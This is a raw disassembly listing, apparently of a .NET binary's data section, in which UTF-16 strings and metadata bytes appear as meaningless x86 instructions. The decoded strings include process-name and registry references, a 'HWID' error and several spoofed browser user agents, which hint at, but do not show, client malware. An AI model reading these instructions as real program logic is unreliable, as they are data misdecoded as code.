  40ab5d:	00 17                	add    %dl,(%edi)
  40ab5f:	50                   	push   %eax
  40ab60:	00 72 00             	add    %dh,0x0(%edx)
  40ab63:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab64:	00 63 00             	add    %ah,0x0(%ebx)
  40ab67:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ab6b:	73 00                	jae    0x40ab6d
  40ab6d:	4e                   	dec    %esi
  40ab6e:	00 61 00             	add    %ah,0x0(%ecx)
  40ab71:	6d                   	insl   (%dx),%es:(%edi)
  40ab72:	00 65 00             	add    %ah,0x0(%ebp)
  40ab75:	00 07                	add    %al,(%edi)
  40ab77:	3f                   	aas
  40ab78:	00 3f                	add    %bh,(%edi)
  40ab7a:	00 3f                	add    %bh,(%edi)
  40ab7c:	00 00                	add    %al,(%eax)
  40ab7e:	13 53 00             	adc    0x0(%ebx),%edx
  40ab81:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab82:	00 66 00             	add    %ah,0x0(%esi)
  40ab85:	74 00                	je     0x40ab87
  40ab87:	77 00                	ja     0x40ab89
  40ab89:	61                   	popa
  40ab8a:	00 72 00             	add    %dh,0x0(%edx)
  40ab8d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40ab92:	80 9b 4d 00 6f 00 7a 	sbbb   $0x7a,0x6f004d(%ebx)
  40ab99:	00 69 00             	add    %ch,0x0(%ecx)
  40ab9c:	6c                   	insb   (%dx),%es:(%edi)
  40ab9d:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40aba1:	00 2f                	add    %ch,(%edi)
  40aba3:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40aba9:	00 20                	add    %ah,(%eax)
  40abab:	00 28                	add    %ch,(%eax)
  40abad:	00 57 00             	add    %dl,0x0(%edi)
  40abb0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40abb6:	6f                   	outsl  %ds:(%esi),(%dx)
  40abb7:	00 77 00             	add    %dh,0x0(%edi)
  40abba:	73 00                	jae    0x40abbc
  40abbc:	20 00                	and    %al,(%eax)
  40abbe:	4e                   	dec    %esi
  40abbf:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40abc3:	00 36                	add    %dh,(%esi)
  40abc5:	00 2e                	add    %ch,(%esi)
  40abc7:	00 31                	add    %dh,(%ecx)
  40abc9:	00 3b                	add    %bh,(%ebx)
  40abcb:	00 20                	add    %ah,(%eax)
  40abcd:	00 57 00             	add    %dl,0x0(%edi)
  40abd0:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40abd6:	34 00                	xor    $0x0,%al
  40abd8:	3b 00                	cmp    (%eax),%eax
  40abda:	20 00                	and    %al,(%eax)
  40abdc:	78 00                	js     0x40abde
  40abde:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40abe2:	3b 00                	cmp    (%eax),%eax
  40abe4:	20 00                	and    %al,(%eax)
  40abe6:	72 00                	jb     0x40abe8
  40abe8:	76 00                	jbe    0x40abea
  40abea:	3a 00                	cmp    (%eax),%al
  40abec:	36 00 36             	add    %dh,%ss:(%esi)
  40abef:	00 2e                	add    %ch,(%esi)
  40abf1:	00 30                	add    %dh,(%eax)
  40abf3:	00 29                	add    %ch,(%ecx)
  40abf5:	00 20                	add    %ah,(%eax)
  40abf7:	00 47 00             	add    %al,0x0(%edi)
  40abfa:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40abfe:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40ac01:	00 2f                	add    %ch,(%edi)
  40ac03:	00 32                	add    %dh,(%edx)
  40ac05:	00 30                	add    %dh,(%eax)
  40ac07:	00 31                	add    %dh,(%ecx)
  40ac09:	00 30                	add    %dh,(%eax)
  40ac0b:	00 30                	add    %dh,(%eax)
  40ac0d:	00 31                	add    %dh,(%ecx)
  40ac0f:	00 30                	add    %dh,(%eax)
  40ac11:	00 31                	add    %dh,(%ecx)
  40ac13:	00 20                	add    %ah,(%eax)
  40ac15:	00 46 00             	add    %al,0x0(%esi)
  40ac18:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40ac1e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ac22:	78 00                	js     0x40ac24
  40ac24:	2f                   	das
  40ac25:	00 36                	add    %dh,(%esi)
  40ac27:	00 36                	add    %dh,(%esi)
  40ac29:	00 2e                	add    %ch,(%esi)
  40ac2b:	00 30                	add    %dh,(%eax)
  40ac2d:	00 00                	add    %al,(%eax)
  40ac2f:	81 13 4d 00 6f 00    	adcl   $0x6f004d,(%ebx)
  40ac35:	7a 00                	jp     0x40ac37
  40ac37:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40ac3d:	61                   	popa
  40ac3e:	00 2f                	add    %ch,(%edi)
  40ac40:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40ac46:	00 20                	add    %ah,(%eax)
  40ac48:	00 28                	add    %ch,(%eax)
  40ac4a:	00 69 00             	add    %ch,0x0(%ecx)
  40ac4d:	50                   	push   %eax
  40ac4e:	00 68 00             	add    %ch,0x0(%eax)
  40ac51:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac52:	00 6e 00             	add    %ch,0x0(%esi)
  40ac55:	65 00 3b             	add    %bh,%gs:(%ebx)
  40ac58:	00 20                	add    %ah,(%eax)
  40ac5a:	00 43 00             	add    %al,0x0(%ebx)
  40ac5d:	50                   	push   %eax
  40ac5e:	00 55 00             	add    %dl,0x0(%ebp)
  40ac61:	20 00                	and    %al,(%eax)
  40ac63:	69 00 50 00 68 00    	imul   $0x680050,(%eax),%eax
  40ac69:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac6a:	00 6e 00             	add    %ch,0x0(%esi)
  40ac6d:	65 00 20             	add    %ah,%gs:(%eax)
  40ac70:	00 4f 00             	add    %cl,0x0(%edi)
  40ac73:	53                   	push   %ebx
  40ac74:	00 20                	add    %ah,(%eax)
  40ac76:	00 31                	add    %dh,(%ecx)
  40ac78:	00 31                	add    %dh,(%ecx)
  40ac7a:	00 5f 00             	add    %bl,0x0(%edi)
  40ac7d:	34 00                	xor    $0x0,%al
  40ac7f:	5f                   	pop    %edi
  40ac80:	00 31                	add    %dh,(%ecx)
  40ac82:	00 20                	add    %ah,(%eax)
  40ac84:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40ac88:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac8b:	65 00 20             	add    %ah,%gs:(%eax)
  40ac8e:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac91:	61                   	popa
  40ac92:	00 63 00             	add    %ah,0x0(%ebx)
  40ac95:	20 00                	and    %al,(%eax)
  40ac97:	4f                   	dec    %edi
  40ac98:	00 53 00             	add    %dl,0x0(%ebx)
  40ac9b:	20 00                	and    %al,(%eax)
  40ac9d:	58                   	pop    %eax
  40ac9e:	00 29                	add    %ch,(%ecx)
  40aca0:	00 20                	add    %ah,(%eax)
  40aca2:	00 41 00             	add    %al,0x0(%ecx)
  40aca5:	70 00                	jo     0x40aca7
  40aca7:	70 00                	jo     0x40aca9
  40aca9:	6c                   	insb   (%dx),%es:(%edi)
  40acaa:	00 65 00             	add    %ah,0x0(%ebp)
  40acad:	57                   	push   %edi
  40acae:	00 65 00             	add    %ah,0x0(%ebp)
  40acb1:	62 00                	bound  %eax,(%eax)
  40acb3:	4b                   	dec    %ebx
  40acb4:	00 69 00             	add    %ch,0x0(%ecx)
  40acb7:	74 00                	je     0x40acb9
  40acb9:	2f                   	das
  40acba:	00 36                	add    %dh,(%esi)
  40acbc:	00 30                	add    %dh,(%eax)
  40acbe:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  40acc4:	00 2e                	add    %ch,(%esi)
  40acc6:	00 31                	add    %dh,(%ecx)
  40acc8:	00 35 00 20 00 28    	add    %dh,0x28002000
  40acce:	00 4b 00             	add    %cl,0x0(%ebx)
  40acd1:	48                   	dec    %eax
  40acd2:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40acd6:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  40acda:	00 20                	add    %ah,(%eax)
  40acdc:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40ace0:	00 6b 00             	add    %ch,0x0(%ebx)
  40ace3:	65 00 20             	add    %ah,%gs:(%eax)
  40ace6:	00 47 00             	add    %al,0x0(%edi)
  40ace9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40aced:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40acf0:	00 29                	add    %ch,(%ecx)
  40acf2:	00 20                	add    %ah,(%eax)
  40acf4:	00 56 00             	add    %dl,0x0(%esi)
  40acf7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40acfb:	73 00                	jae    0x40acfd
  40acfd:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ad03:	2f                   	das
  40ad04:	00 31                	add    %dh,(%ecx)
  40ad06:	00 31                	add    %dh,(%ecx)
  40ad08:	00 2e                	add    %ch,(%esi)
  40ad0a:	00 30                	add    %dh,(%eax)
  40ad0c:	00 20                	add    %ah,(%eax)
  40ad0e:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad11:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad12:	00 62 00             	add    %ah,0x0(%edx)
  40ad15:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40ad1b:	2f                   	das
  40ad1c:	00 31                	add    %dh,(%ecx)
  40ad1e:	00 35 00 45 00 31    	add    %dh,0x31004500
  40ad24:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad27:	38 00                	cmp    %al,(%eax)
  40ad29:	20 00                	and    %al,(%eax)
  40ad2b:	53                   	push   %ebx
  40ad2c:	00 61 00             	add    %ah,0x0(%ecx)
  40ad2f:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40ad33:	72 00                	jb     0x40ad35
  40ad35:	69 00 2f 00 36 00    	imul   $0x36002f,(%eax),%eax
  40ad3b:	30 00                	xor    %al,(%eax)
  40ad3d:	34 00                	xor    $0x0,%al
  40ad3f:	2e 00 31             	add    %dh,%cs:(%ecx)
  40ad42:	00 00                	add    %al,(%eax)
  40ad44:	80 e7 4d             	and    $0x4d,%bh
  40ad47:	00 6f 00             	add    %ch,0x0(%edi)
  40ad4a:	7a 00                	jp     0x40ad4c
  40ad4c:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40ad52:	61                   	popa
  40ad53:	00 2f                	add    %ch,(%edi)
  40ad55:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40ad5b:	00 20                	add    %ah,(%eax)
  40ad5d:	00 28                	add    %ch,(%eax)
  40ad5f:	00 57 00             	add    %dl,0x0(%edi)
  40ad62:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40ad68:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad69:	00 77 00             	add    %dh,0x0(%edi)
  40ad6c:	73 00                	jae    0x40ad6e
  40ad6e:	20 00                	and    %al,(%eax)
  40ad70:	4e                   	dec    %esi
  40ad71:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40ad75:	00 31                	add    %dh,(%ecx)
  40ad77:	00 30                	add    %dh,(%eax)
  40ad79:	00 2e                	add    %ch,(%esi)
  40ad7b:	00 30                	add    %dh,(%eax)
  40ad7d:	00 3b                	add    %bh,(%ebx)
  40ad7f:	00 20                	add    %ah,(%eax)
  40ad81:	00 57 00             	add    %dl,0x0(%edi)
  40ad84:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40ad8a:	34 00                	xor    $0x0,%al
  40ad8c:	3b 00                	cmp    (%eax),%eax
  40ad8e:	20 00                	and    %al,(%eax)
  40ad90:	78 00                	js     0x40ad92
  40ad92:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40ad96:	29 00                	sub    %eax,(%eax)
  40ad98:	20 00                	and    %al,(%eax)
  40ad9a:	41                   	inc    %ecx
  40ad9b:	00 70 00             	add    %dh,0x0(%eax)
  40ad9e:	70 00                	jo     0x40ada0
  40ada0:	6c                   	insb   (%dx),%es:(%edi)
  40ada1:	00 65 00             	add    %ah,0x0(%ebp)
  40ada4:	57                   	push   %edi
  40ada5:	00 65 00             	add    %ah,0x0(%ebp)
  40ada8:	62 00                	bound  %eax,(%eax)
  40adaa:	4b                   	dec    %ebx
  40adab:	00 69 00             	add    %ch,0x0(%ecx)
  40adae:	74 00                	je     0x40adb0
  40adb0:	2f                   	das
  40adb1:	00 35 00 33 00 37    	add    %dh,0x37003300
  40adb7:	00 2e                	add    %ch,(%esi)
  40adb9:	00 33                	add    %dh,(%ebx)
  40adbb:	00 36                	add    %dh,(%esi)
  40adbd:	00 20                	add    %ah,(%eax)
  40adbf:	00 28                	add    %ch,(%eax)
  40adc1:	00 4b 00             	add    %cl,0x0(%ebx)
  40adc4:	48                   	dec    %eax
  40adc5:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40adc9:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  40adcd:	00 20                	add    %ah,(%eax)
  40adcf:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40add3:	00 6b 00             	add    %ch,0x0(%ebx)
  40add6:	65 00 20             	add    %ah,%gs:(%eax)
  40add9:	00 47 00             	add    %al,0x0(%edi)
  40addc:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ade0:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40ade3:	00 29                	add    %ch,(%ecx)
  40ade5:	00 20                	add    %ah,(%eax)
  40ade7:	00 43 00             	add    %al,0x0(%ebx)
  40adea:	68 00 72 00 6f       	push   $0x6f007200
  40adef:	00 6d 00             	add    %ch,0x0(%ebp)
  40adf2:	65 00 2f             	add    %ch,%gs:(%edi)
  40adf5:	00 36                	add    %dh,(%esi)
  40adf7:	00 30                	add    %dh,(%eax)
  40adf9:	00 2e                	add    %ch,(%esi)
  40adfb:	00 30                	add    %dh,(%eax)
  40adfd:	00 2e                	add    %ch,(%esi)
  40adff:	00 33                	add    %dh,(%ebx)
  40ae01:	00 31                	add    %dh,(%ecx)
  40ae03:	00 31                	add    %dh,(%ecx)
  40ae05:	00 32                	add    %dh,(%edx)
  40ae07:	00 2e                	add    %ch,(%esi)
  40ae09:	00 31                	add    %dh,(%ecx)
  40ae0b:	00 31                	add    %dh,(%ecx)
  40ae0d:	00 33                	add    %dh,(%ebx)
  40ae0f:	00 20                	add    %ah,(%eax)
  40ae11:	00 53 00             	add    %dl,0x0(%ebx)
  40ae14:	61                   	popa
  40ae15:	00 66 00             	add    %ah,0x0(%esi)
  40ae18:	61                   	popa
  40ae19:	00 72 00             	add    %dh,0x0(%edx)
  40ae1c:	69 00 2f 00 35 00    	imul   $0x35002f,(%eax),%eax
  40ae22:	33 00                	xor    (%eax),%eax
  40ae24:	37                   	aaa
  40ae25:	00 2e                	add    %ch,(%esi)
  40ae27:	00 33                	add    %dh,(%ebx)
  40ae29:	00 36                	add    %dh,(%esi)
  40ae2b:	00 00                	add    %al,(%eax)
  40ae2d:	35 61 00 62 00       	xor    $0x620061,%eax
  40ae32:	63 00                	arpl   %eax,(%eax)
  40ae34:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40ae38:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40ae3c:	68 00 69 00 6a       	push   $0x6a006900
  40ae41:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae44:	6c                   	insb   (%dx),%es:(%edi)
  40ae45:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae48:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae49:	00 6f 00             	add    %ch,0x0(%edi)
  40ae4c:	70 00                	jo     0x40ae4e
  40ae4e:	71 00                	jno    0x40ae50
  40ae50:	72 00                	jb     0x40ae52
  40ae52:	73 00                	jae    0x40ae54
  40ae54:	74 00                	je     0x40ae56
  40ae56:	75 00                	jne    0x40ae58
  40ae58:	76 00                	jbe    0x40ae5a
  40ae5a:	77 00                	ja     0x40ae5c
  40ae5c:	78 00                	js     0x40ae5e
  40ae5e:	79 00                	jns    0x40ae60
  40ae60:	7a 00                	jp     0x40ae62
  40ae62:	00 11                	add    %dl,(%ecx)
  40ae64:	45                   	inc    %ebp
  40ae65:	00 72 00             	add    %dh,0x0(%edx)
  40ae68:	72 00                	jb     0x40ae6a
  40ae6a:	20 00                	and    %al,(%eax)
  40ae6c:	48                   	dec    %eax
  40ae6d:	00 57 00             	add    %dl,0x0(%edi)
  40ae70:	49                   	dec    %ecx
  40ae71:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ae75:	05 78 00 32 00       	add    $0x320078,%eax
  40ae7a:	00 09                	add    %cl,(%ecx)
  40ae7c:	52                   	push   %edx
  40ae7d:	00 65 00             	add    %ah,0x0(%ebp)
  40ae80:	61                   	popa
  40ae81:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40ae85:	0b 57 00             	or     0x0(%edi),%edx
  40ae88:	72 00                	jb     0x40ae8a
  40ae8a:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40ae90:	00 0b                	add    %cl,(%ebx)
  40ae92:	46                   	inc    %esi
  40ae93:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40ae97:	00 73 00             	add    %dh,0x0(%ebx)
  40ae9a:	68 00 00 0f 54       	push   $0x540f0000
  40ae9f:	00 6f 00             	add    %ch,0x0(%edi)
  40aea2:	41                   	inc    %ecx
  40aea3:	00 72 00             	add    %dh,0x0(%edx)
  40aea6:	72 00                	jb     0x40aea8
  40aea8:	61                   	popa
  40aea9:	00 79 00             	add    %bh,0x0(%ecx)
  40aeac:	00 00                	add    %al,(%eax)
  40aeae:	00 00                	add    %al,(%eax)
  40aeb0:	f6 c6 39             	test   $0x39,%dh
  40aeb3:	89 89 85 11 48 91    	mov    %ecx,-0x6eb7ee7b(%ecx)
  40aeb9:	f9                   	stc
  40aeba:	4f                   	dec    %edi
  40aebb:	7a 83                	jp     0x40ae40
  40aebd:	d5 82                	aad    $0x82
  40aebf:	fd                   	std
  40aec0:	00 08                	add    %cl,(%eax)
  40aec2:	b7 7a                	mov    $0x7a,%bh
  40aec4:	5c                   	pop    %esp
  40aec5:	56                   	push   %esi
  40aec6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40aec9:	89 08                	mov    %ecx,(%eax)
  40aecb:	b0 3f                	mov    $0x3f,%al
  40aecd:	5f                   	pop    %edi
  40aece:	7f 11                	jg     0x40aee1
  40aed0:	d5 0a                	aad    $0xa
  40aed2:	3a 03                	cmp    (%ebx),%al
  40aed4:	20 00                	and    %al,(%eax)
  40aed6:	01 03                	add    %eax,(%ebx)
  40aed8:	00 00                	add    %al,(%eax)
  40aeda:	01 04 00             	add    %eax,(%eax,%eax,1)
  40aedd:	00 12                	add    %dl,(%edx)
  40aedf:	0c 07                	or     $0x7,%al
  40aee1:	06                   	push   %es
  40aee2:	15 12 18 01 12       	adc    $0x12011812,%eax
  40aee7:	0c 04                	or     $0x4,%al
  40aee9:	00 00                	add    %al,(%eax)
  40aeeb:	12 08                	adc    (%eax),%cl
  40aeed:	07                   	pop    %es
  40aeee:	06                   	push   %es
  40aeef:	15 12 18 01 12       	adc    $0x12011812,%eax
  40aef4:	08 04 00             	or     %al,(%eax,%eax,1)
  40aef7:	00 12                	add    %dl,(%edx)
  40aef9:	11 07                	adc    %eax,(%edi)
  40aefb:	06                   	push   %es
  40aefc:	15 12 18 01 12       	adc    $0x12011812,%eax
  40af01:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40af04:	00 12                	add    %dl,(%edx)
  40af06:	14 07                	adc    $0x7,%al
  40af08:	06                   	push   %es
  40af09:	15 12 18 01 12       	adc    $0x12011812,%eax
  40af0e:	14 04                	adc    $0x4,%al
  40af10:	08 00                	or     %al,(%eax)
  40af12:	12 0c 04             	adc    (%esp,%eax,1),%cl
  40af15:	08 00                	or     %al,(%eax)
  40af17:	12 08                	adc    (%eax),%cl
  40af19:	04 08                	add    $0x8,%al
  40af1b:	00 12                	add    %dl,(%edx)
  40af1d:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40af20:	00 12                	add    %dl,(%edx)
  40af22:	14 04                	adc    $0x4,%al
  40af24:	20 01                	and    %al,(%ecx)
  40af26:	02 1c 03             	add    (%ebx,%eax,1),%bl
  40af29:	20 00                	and    %al,(%eax)
  40af2b:	08 04 20             	or     %al,(%eax,%eiz,1)
  40af2e:	00 12                	add    %dl,(%edx)
  40af30:	15 03 20 00 0e       	adc    $0xe002003,%eax
  40af35:	02 1e                	add    (%esi),%bl
  40af37:	00 07                	add    %al,(%edi)
  40af39:	10 01                	adc    %al,(%ecx)
  40af3b:	01 1e                	add    %ebx,(%esi)
  40af3d:	00 1e                	add    %bl,(%esi)
  40af3f:	00 07                	add    %al,(%edi)
  40af41:	30 01                	xor    %al,(%ecx)
  40af43:	01 01                	add    %eax,(%ecx)
  40af45:	10 1e                	adc    %bl,(%esi)
  40af47:	00 02                	add    %al,(%edx)
  40af49:	13 00                	adc    (%eax),%eax
  40af4b:	04 20                	add    $0x20,%al
  40af4d:	00 13                	add    %dl,(%ebx)
  40af4f:	00 03                	add    %al,(%ebx)
  40af51:	06                   	push   %es
  40af52:	13 00                	adc    (%eax),%eax
  40af54:	04 28                	add    $0x28,%al
  40af56:	00 13                	add    %dl,(%ebx)
  40af58:	00 02                	add    %al,(%edx)
  40af5a:	06                   	push   %es
  40af5b:	0e                   	push   %cs
  40af5c:	02 06                	add    (%esi),%al
  40af5e:	08 03                	or     %al,(%ebx)
  40af60:	00 00                	add    %al,(%eax)
  40af62:	02 04 00             	add    (%eax,%eax,1),%al
  40af65:	01 18                	add    %ebx,(%eax)
  40af67:	0e                   	push   %cs
  40af68:	06                   	push   %es
  40af69:	00 02                	add    %al,(%edx)
  40af6b:	02 18                	add    (%eax),%bl
  40af6d:	10 02                	adc    %al,(%edx)
  40af6f:	02 06                	add    (%esi),%al
  40af71:	02 03                	add    (%ebx),%al
  40af73:	06                   	push   %es
  40af74:	12 19                	adc    (%ecx),%bl
  40af76:	02 06                	add    (%esi),%al
  40af78:	0a 03                	or     (%ebx),%al
  40af7a:	06                   	push   %es
  40af7b:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  40af80:	1d 03 06 12 21       	sbb    $0x21120603,%eax
  40af85:	03 06                	add    (%esi),%eax
  40af87:	12 25 02 06 1c 04    	adc    0x41c0602,%ah
  40af8d:	00 01                	add    %al,(%ecx)
  40af8f:	1c 0e                	sbb    $0xe,%al
  40af91:	03 00                	add    (%eax),%eax
  40af93:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40af96:	00 00                	add    %al,(%eax)
  40af98:	0e                   	push   %cs
  40af99:	05 00 01 01 12       	add    $0x12010100,%eax
  40af9e:	29 05 00 01 01 1d    	sub    %eax,0x1d010100
  40afa4:	05 04 00 01 01       	add    $0x1010004,%eax
  40afa9:	0e                   	push   %cs
  40afaa:	04 00                	add    $0x0,%al
  40afac:	01 01                	add    %eax,(%ecx)
  40afae:	1c 03                	sbb    $0x3,%al
  40afb0:	06                   	push   %es
  40afb1:	1d 0e 03 06 12       	sbb    $0x1206030e,%eax
  40afb6:	2d 05 00 02 01       	sub    $0x1020005,%eax
  40afbb:	0e                   	push   %cs
  40afbc:	02 0b                	add    (%ebx),%cl
  40afbe:	00 08                	add    %cl,(%eax)
  40afc0:	18 0e                	sbb    %cl,(%esi)
  40afc2:	08 08                	or     %cl,(%eax)
  40afc4:	08 08                	or     %cl,(%eax)
  40afc6:	08 08                	or     %cl,(%eax)
  40afc8:	08 02                	or     %al,(%edx)
  40afca:	06                   	push   %es
  40afcb:	18 0a                	sbb    %cl,(%edx)
  40afcd:	00 05 02 06 10 0e    	add    %al,0xe100602
  40afd3:	08 10                	or     %dl,(%eax)
  40afd5:	0e                   	push   %cs
  40afd6:	08 06                	or     %al,(%esi)
  40afd8:	00 02                	add    %al,(%edx)
  40afda:	01 0e                	add    %ecx,(%esi)
  40afdc:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40afe1:	1c 1d                	sbb    $0x1d,%al
  40afe3:	05 07 00 03 01       	add    $0x1030007,%eax
  40afe8:	02 0e                	add    (%esi),%cl
  40afea:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40afef:	18 12                	sbb    %dl,(%edx)
  40aff1:	40                   	inc    %eax
  40aff2:	06                   	push   %es
  40aff3:	00 03                	add    %al,(%ebx)
  40aff5:	18 08                	sbb    %cl,(%eax)
  40aff7:	18 18                	sbb    %bl,(%eax)
  40aff9:	04 00                	add    $0x0,%al
  40affb:	01 0e                	add    %ecx,(%esi)
  40affd:	09 04 00             	or     %eax,(%eax,%eax,1)
  40b000:	01 00                	add    %eax,(%eax)
  40b002:	00 03                	add    %al,(%ebx)
  40b004:	06                   	push   %es
  40b005:	12 40 08             	adc    0x8(%eax),%al
  40b008:	00 04 18             	add    %al,(%eax,%ebx,1)
  40b00b:	08 12                	or     %dl,(%edx)
  40b00d:	40                   	inc    %eax
  40b00e:	18 09                	sbb    %cl,(%ecx)
  40b010:	04 00                	add    $0x0,%al
  40b012:	01 02                	add    %eax,(%edx)
  40b014:	18 07                	sbb    %al,(%edi)
  40b016:	00 04 18             	add    %al,(%eax,%ebx,1)
  40b019:	18 08                	sbb    %cl,(%eax)
  40b01b:	18 18                	sbb    %bl,(%eax)
  40b01d:	03 00                	add    (%eax),%eax
  40b01f:	00 18                	add    %bl,(%eax)
  40b021:	06                   	push   %es
  40b022:	00 02                	add    %al,(%edx)
  40b024:	09 18                	or     %ebx,(%eax)
  40b026:	10 09                	adc    %cl,(%ecx)
  40b028:	04 00                	add    $0x0,%al
  40b02a:	01 06                	add    %eax,(%esi)
  40b02c:	08 05 00 01 02 1d    	or     %al,0x1d020100
  40b032:	05 04 00 01 18       	add    $0x18010004,%eax
  40b037:	09 0c 00             	or     %ecx,(%eax,%eax,1)
  40b03a:	07                   	pop    %es
  40b03b:	08 09                	or     %cl,(%ecx)
  40b03d:	09 1d 05 12 31 08    	or     %ebx,0x8311205
  40b043:	09 18                	or     %ebx,(%eax)
  40b045:	05 00 02 09 09       	add    $0x9090200,%eax
  40b04a:	09 07                	or     %eax,(%edi)
  40b04c:	00 03                	add    %al,(%ebx)
  40b04e:	01 02                	add    %eax,(%edx)
  40b050:	10 02                	adc    %al,(%edx)
  40b052:	02 06                	add    (%esi),%al
  40b054:	00 02                	add    %al,(%edx)
  40b056:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40b059:	35 04 00 01 08       	xor    $0x8010004,%eax
  40b05e:	08 04 00             	or     %al,(%eax,%eax,1)
  40b061:	01 02                	add    %eax,(%edx)
  40b063:	0e                   	push   %cs
  40b064:	03 06                	add    (%esi),%eax
  40b066:	12 39                	adc    (%ecx),%bh
  40b068:	34 61                	xor    $0x61,%al
  40b06a:	00 62 00             	add    %ah,0x0(%edx)
  40b06d:	63 00                	arpl   %eax,(%eax)
  40b06f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b073:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40b077:	68 00 69 00 6a       	push   $0x6a006900
  40b07c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b07f:	6c                   	insb   (%dx),%es:(%edi)
  40b080:	00 6d 00             	add    %ch,0x0(%ebp)
  40b083:	6e                   	outsb  %ds:(%esi),(%dx)
  40b084:	00 6f 00             	add    %ch,0x0(%edi)
  40b087:	70 00                	jo     0x40b089
  40b089:	71 00                	jno    0x40b08b
  40b08b:	72 00                	jb     0x40b08d
  40b08d:	73 00                	jae    0x40b08f
  40b08f:	74 00                	je     0x40b091
  40b091:	75 00                	jne    0x40b093
  40b093:	76 00                	jbe    0x40b095
  40b095:	77 00                	ja     0x40b097
  40b097:	78 00                	js     0x40b099
  40b099:	79 00                	jns    0x40b09b
  40b09b:	7a 00                	jp     0x40b09d
  40b09d:	03 06                	add    (%esi),%eax
  40b09f:	12 3d 04 00 01 0e    	adc    0xe010004,%bh
  40b0a5:	08 06                	or     %al,(%esi)
  40b0a7:	00 01                	add    %al,(%ecx)
  40b0a9:	02 10                	add    (%eax),%dl
  40b0ab:	11 44 03 06          	adc    %eax,0x6(%ebx,%eax,1)
  40b0af:	11 44 03 00          	adc    %eax,0x0(%ebx,%eax,1)
  40b0b3:	00 08                	add    %cl,(%eax)
  40b0b5:	03 06                	add    (%esi),%eax
  40b0b7:	11 41 07             	adc    %eax,0x7(%ecx)
  40b0ba:	00 03                	add    %al,(%ebx)
  40b0bc:	08 18                	or     %bl,(%eax)
  40b0be:	12 31                	adc    (%ecx),%dh
  40b0c0:	08 06                	or     %al,(%esi)
  40b0c2:	00 01                	add    %al,(%ecx)
  40b0c4:	11 48 11             	adc    %ecx,0x11(%eax)
  40b0c7:	48                   	dec    %eax
  40b0c8:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40b0cd:	0e                   	push   %cs
  40b0ce:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40b0d3:	05 04 00 01 0e       	add    $0xe010004,%eax
  40b0d8:	0e                   	push   %cs
  40b0d9:	06                   	push   %es
  40b0da:	00 02                	add    %al,(%edx)
  40b0dc:	02 0e                	add    (%esi),%cl
  40b0de:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  40b0e3:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40b0e8:	06                   	push   %es
  40b0e9:	12 45 05             	adc    0x5(%ebp),%al
  40b0ec:	20 02                	and    %al,(%edx)
